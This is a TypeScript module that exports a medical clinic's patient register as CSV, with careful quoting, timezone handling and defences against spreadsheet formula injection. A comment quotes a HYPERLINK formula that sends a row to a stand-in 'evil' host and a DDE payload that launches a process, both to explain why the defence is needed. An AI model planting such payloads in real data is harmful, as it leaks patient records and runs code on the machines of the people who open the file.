import type { RegisterEntry } from "@/lib/types";

/**
 * The register as a spreadsheet.
 *
 * Everything here is pure and dependency-free — no Supabase client, no
 * `server-only` — so the escaping rules can be unit tested directly. They are
 * the part of an export that is easy to get subtly wrong and impossible to
 * notice afterwards: a mis-quoted comma silently shifts a diagnosis into the
 * fee column, and the file still opens.
 */

/**
 * A register row, as the export needs it.
 *
 * Derived from `RegisterEntry` rather than restated so a change to the register
 * shape fails at compile time here instead of quietly dropping a column.
 */
export type RegisterExportRow = Pick<
  RegisterEntry,
  | "occurred_at"
  | "patient_name"
  | "age_years"
  | "diagnosis"
  | "treatment"
  | "is_new_patient"
  | "visit_number"
  | "status"
  | "drugs"
> & {
  /**
   * Optional because migration 0019 rebuilt `register_search` without
   * `fees_inr` (0009 and 0012 returned it), so rows read through
   * `searchRegister` cannot carry a fee yet and the cell comes out blank.
   * Kept in the contract because `encounters.fees_inr` still exists and this
   * file is the one an accountant opens — restoring the column upstream should
   * not also mean rewriting the CSV.
   */
  fees_inr?: number | null;
};

export const REGISTER_EXPORT_COLUMNS = [
  "Date",
  "Time",
  "Patient",
  "Age",
  "Visit",
  "New patient",
  "Diagnosis",
  "Treatment",
  "Prescription",
  "Fee (INR)",
  "Status",
] as const;

/**
 * A visit's clock time belongs to the clinic, not to the server. Both
 * formatters are hoisted because constructing an `Intl.DateTimeFormat` is the
 * expensive part and an export builds two per row otherwise.
 */
const istDate = new Intl.DateTimeFormat("en-CA", {
  timeZone: "Asia/Kolkata",
  year: "numeric",
  month: "2-digit",
  day: "2-digit",
});

const istTime = new Intl.DateTimeFormat("en-GB", {
  timeZone: "Asia/Kolkata",
  hour: "2-digit",
  minute: "2-digit",
  hourCycle: "h23",
});

/** The words the register itself uses, so the file matches the screen. */
const STATUS_LABELS: Record<string, string> = {
  committed: "Confirmed",
  draft: "Needs review",
  discarded: "Discarded",
};

/**
 * Excel and Google Sheets evaluate a cell as a formula when its text begins
 * with one of these, and a CSV carries no "this is text" flag to say otherwise.
 * That turns a patient name into code: `=HYPERLINK("https://evil/"&A2,"open")`
 * posts the row to someone else's server when the accountant clicks it, and the
 * legacy DDE form (`=cmd|'/c calc'!A0`) asks Excel to start a process. Both of
 * those are typed by a *person* — in a multi-doctor clinic the name, diagnosis
 * and treatment on a visit may have been entered by a colleague, and the doctor
 * exporting has no reason to inspect them.
 *
 * Tab and CR are here for the same reason: Excel's import strips leading
 * whitespace, so a cell that starts with one still lands on the `=` behind it.
 *
 * The fix is the one OWASP gives — a leading apostrophe, which spreadsheets
 * read as "the rest is literal". The cost is that a diagnosis genuinely written
 * as "-ve for malaria" exports as "'-ve for malaria". An apostrophe a doctor can
 * see and delete is the better failure.
 */
const FORMULA_LEAD = new Set(["=", "+", "-", "@", "\t", "\r"]);

function neutraliseFormula(value: string): string {
  return FORMULA_LEAD.has(value.charAt(0)) ? `'${value}` : value;
}

/**
 * RFC 4180 quoting: a field is quoted only when it has to be, and a quote
 * inside a quoted field is doubled.
 */
function quoteField(value: string): string {
  return /[",\r\n]/.test(value) ? `"${value.replace(/"/g, '""')}"` : value;
}

function csvCell(value: string): string {
  return quoteField(neutraliseFormula(value));
}

function textCell(value: string | null | undefined): string {
  return value ?? "";
}

/** A missing count is an empty cell, never a `0` the doctor never recorded. */
function numberCell(value: number | null | undefined): string {
  return typeof value === "number" && Number.isFinite(value) ? String(value) : "";
}

function booleanCell(value: boolean | null | undefined): string {
  return value === null || value === undefined ? "" : value ? "Yes" : "No";
}

function istCell(iso: string, formatter: Intl.DateTimeFormat): string {
  const date = new Date(iso);
  // `Intl.DateTimeFormat.format()` throws a RangeError on an Invalid Date, and
  // one unparseable timestamp must not cost the doctor the other 400 rows.
  return Number.isNaN(date.getTime()) ? "" : formatter.format(date);
}

function registerRowCells(row: RegisterExportRow): string[] {
  return [
    istCell(row.occurred_at, istDate),
    istCell(row.occurred_at, istTime),
    textCell(row.patient_name),
    numberCell(row.age_years),
    numberCell(row.visit_number),
    booleanCell(row.is_new_patient),
    textCell(row.diagnosis),
    textCell(row.treatment),
    // Semicolons rather than commas: both quote correctly, but a reader
    // scanning the column should not have to tell a drug list apart from the
    // field separator by eye.
    (row.drugs ?? []).join("; "),
    numberCell(row.fees_inr),
    STATUS_LABELS[row.status] ?? row.status,
  ];
}

/** Escaped rather than typed literally so an editor cannot silently eat it. */
const BOM = "\uFEFF";

/**
 * Build the register CSV.
 *
 * Two details are load-bearing for the clinics this ships to:
 *
 *  - The leading U+FEFF. Excel on Windows decodes a CSV in the machine's ANSI
 *    codepage unless a BOM tells it otherwise, and a Devanagari patient name —
 *    सुनीता देवी — comes back as mojibake. Devanagari is the ordinary case here,
 *    not an edge case, so the BOM is not optional.
 *  - CRLF between records, as RFC 4180 specifies. The trailing CRLF the spec
 *    allows is included so that appending to the file cannot join two records.
 */
export function buildRegisterCsv(rows: RegisterExportRow[]): string {
  const records = [
    [...REGISTER_EXPORT_COLUMNS],
    ...rows.map(registerRowCells),
  ];

  const body = records.map((cells) => cells.map(csvCell).join(",")).join("\r\n");
  return `${BOM}${body}\r\n`;
}

/**
 * `register-2026-07-01-to-2026-07-31.csv`.
 *
 * The dates are stripped to digits and dashes before they reach the caller's
 * `Content-Disposition`, because a filename is the one part of that header
 * built from a query string — a quote or a newline in it would let a caller
 * write the rest of the header.
 */
export function registerExportFilename(from: string, to: string): string {
  const safe = (day: string) => day.replace(/[^\d-]/g, "");
  return `register-${safe(from)}-to-${safe(to)}.csv`;
}
